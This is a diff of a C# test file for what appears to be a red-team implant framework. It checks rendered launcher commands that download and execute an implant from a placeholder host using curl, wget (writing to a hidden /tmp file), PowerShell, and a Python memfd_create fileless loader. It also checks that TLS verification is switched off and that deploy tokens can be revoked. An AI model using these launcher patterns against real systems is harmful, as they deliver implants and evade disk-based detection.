@@ -6,7 +6,7 @@ using Microsoft.Extensions.Hosting;
 using Rod.Audit;
 using Rod.CoreState;
 using Rod.CoreState.Engagements;
-using Rod.CoreState.Staging;
+using Rod.CoreState.Deployment;
 using Rod.Transport;
 using Rod.Transport.Endpoints;
 using Rod.Transport.Listeners;
@@ -56,7 +56,7 @@ public class LauncherRenderTests
         var body = await rendered.Content.ReadFromJsonAsync<LauncherRenderDto>();
         Assert.NotNull(body);
         Assert.Equal(newest.ToString("N"), body!.PayloadId);
-        Assert.Equal($"http://stage.example.test/implants/stage2/{newest:N}", body.Url);
+        Assert.Equal($"http://stage.example.test/implants/payloads/{newest:N}", body.Url);
         Assert.False(string.IsNullOrEmpty(body.TokenSecret));
         Assert.Contains(body.Launchers, l => l.Id == "unix-curl" && l.Command.Contains(body.Url));
         Assert.Contains(body.Launchers, l => l.Id == "unix-wget");
@@ -110,13 +110,13 @@ public class LauncherRenderTests
         rendered.EnsureSuccessStatusCode();
         var body = await rendered.Content.ReadFromJsonAsync<LauncherRenderDto>();
         Assert.NotNull(body);
-        Assert.Equal($"http://front.example.test/implants/stage2/{named:N}", body!.Url);
+        Assert.Equal($"http://front.example.test/implants/payloads/{named:N}", body!.Url);
         Assert.True(body.TokenExpiresAt > DateTimeOffset.UtcNow.AddMinutes(115));
 
         // The minted credential verifies against the token store: it is a
-        // real stager token under the requested policy, not a render-only
+        // real deploy token under the requested policy, not a render-only
         // string.
-        var tokens = env.Host.Services.GetRequiredService<IStagerTokenService>();
+        var tokens = env.Host.Services.GetRequiredService<IDeployTokenService>();
         var verified = await tokens.VerifyAsync(body.TokenSecret, DateTimeOffset.UtcNow);
         Assert.Equal(engagement, verified.EngagementId);
 
@@ -179,8 +179,8 @@ public class LauncherRenderTests
         var deleted = await env.Http.DeleteAsync(
             $"/engagements/{engagementId}/launchers/{row.LauncherId}");
         Assert.Equal(HttpStatusCode.NoContent, deleted.StatusCode);
-        var tokens = env.Host.Services.GetRequiredService<IStagerTokenService>();
-        await Assert.ThrowsAsync<StagerTokenRedeemException>(
+        var tokens = env.Host.Services.GetRequiredService<IDeployTokenService>();
+        await Assert.ThrowsAsync<DeployTokenRedeemException>(
             () => tokens.VerifyAsync(row.TokenSecret, DateTimeOffset.UtcNow));
         var listedAfterDelete = await env.Http.GetFromJsonAsync<LauncherRowDto[]>(
             $"/engagements/{engagementId}/launchers");
@@ -221,8 +221,8 @@ public class LauncherRenderTests
         var revoke = await env.Http.PostAsync(
             $"/engagements/{engagementId}/launchers/{row!.LauncherId}:revoke", content: null);
         revoke.EnsureSuccessStatusCode();
-        var tokens = env.Host.Services.GetRequiredService<IStagerTokenService>();
-        await Assert.ThrowsAsync<StagerTokenRedeemException>(
+        var tokens = env.Host.Services.GetRequiredService<IDeployTokenService>();
+        await Assert.ThrowsAsync<DeployTokenRedeemException>(
             () => tokens.VerifyAsync(row.TokenSecret, DateTimeOffset.UtcNow));
         var listedAfterRevoke = await env.Http.GetFromJsonAsync<LauncherRowDto[]>(
             $"/engagements/{engagementId}/launchers");
@@ -243,7 +243,7 @@ public class LauncherRenderTests
 
     private static PayloadRecord Payload(Guid id, EngagementId engagement, DateTimeOffset builtAt)
         => new(
-            id, engagement.Value, "Stage2", "dotnet", "application/octet-stream",
+            id, engagement.Value, "Implant", "dotnet", "application/octet-stream",
             "sha256:test", [1, 2, 3], 3, builtAt, Target: "linux-x64");
 
     [Fact]
@@ -255,15 +255,22 @@ public class LauncherRenderTests
         // choice is the operator's at paste time, not a build-time axis.
         // The credential rides each command exactly once.
         var rendered = ShellUpgradeLaunchers.Render(
-            "http://stage.example.test/implants/stage2/abc", "secret");
+            "http://stage.example.test/implants/payloads/abc", "secret");
 
         Assert.Contains(rendered, l => l.Id == "unix-curl");
-        Assert.Contains(rendered, l => l.Id == "unix-wget");
+        // Every fetch family must carry the URL it fetches -- a downloader
+        // without one fails silently on the target (-q and friends).
+        Assert.Contains(rendered, l => l.Id == "unix-wget"
+            && l.Command.Contains("http://stage.example.test/implants/payloads/abc")
+            && l.Command.Contains("-O /tmp/.rod-payload"));
         Assert.Contains(rendered, l => l.Id == "windows-powershell");
 
         var memfd = Assert.Single(rendered, l => l.Id == "unix-python-memfd");
         Assert.Equal("linux", memfd.Os);
-        Assert.Contains("memfd_create", memfd.Command);
+        // The memfd acquisition must survive pre-3.8 pythons: prefer
+        // os.memfd_create, fall back to the raw syscall through ctypes.
+        Assert.Contains("getattr(os,'memfd_create',None)", memfd.Command);
+        Assert.Contains("__import__('ctypes').CDLL(None).syscall", memfd.Command);
         Assert.Contains("/proc/self/fd", memfd.Command);
         Assert.Contains("secret", memfd.Command);
         Assert.All(rendered, l => Assert.Contains("secret", l.Command));
@@ -278,7 +285,7 @@ public class LauncherRenderTests
         // https spellings must render runnable: each family carries its
         // own no-verify flag, cleartext fronts none.
         var https = ShellUpgradeLaunchers.Render(
-            "https://stage.example.test/implants/stage2/abc", "secret");
+            "https://stage.example.test/implants/payloads/abc", "secret");
         Assert.Contains(https, l => l.Id == "unix-curl" && l.Command.Contains("-kfsSL"));
         Assert.Contains(https, l => l.Id == "unix-wget" && l.Command.Contains("--no-check-certificate"));
         Assert.Contains(https, l => l.Id == "windows-powershell"
@@ -288,7 +295,7 @@ public class LauncherRenderTests
             && l.Command.Contains("urlopen(q,context=c)"));
 
         var http = ShellUpgradeLaunchers.Render(
-            "http://stage.example.test/implants/stage2/abc", "secret");
+            "http://stage.example.test/implants/payloads/abc", "secret");
         Assert.Contains(http, l => l.Id == "unix-curl" && l.Command.Contains("-fsSL")
             && !l.Command.Contains("-k"));
         Assert.Contains(http, l => l.Id == "unix-wget" && !l.Command.Contains("--no-check-certificate"));
